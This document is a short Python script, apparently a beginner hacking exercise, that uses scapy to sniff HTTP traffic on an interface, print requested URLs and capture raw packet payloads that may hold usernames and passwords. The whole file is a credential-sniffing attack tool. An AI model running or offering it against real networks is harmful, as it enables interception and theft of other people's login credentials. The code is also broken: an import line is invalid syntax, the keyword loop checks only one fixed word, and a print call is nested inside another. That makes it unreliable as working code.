import scapy.all as scapy
import scapy.layer import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=proccess_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path

def get_login_information(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords: 
                if "username" in str(load):
                    return load
                    
    

def proccess_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))
        login_info = get_login_information(packet)
        if login_info:
            print(print("\n\n[+] Possible username/password > " + str(login_info) + "\n\n"))
            
sniff("eth0")
        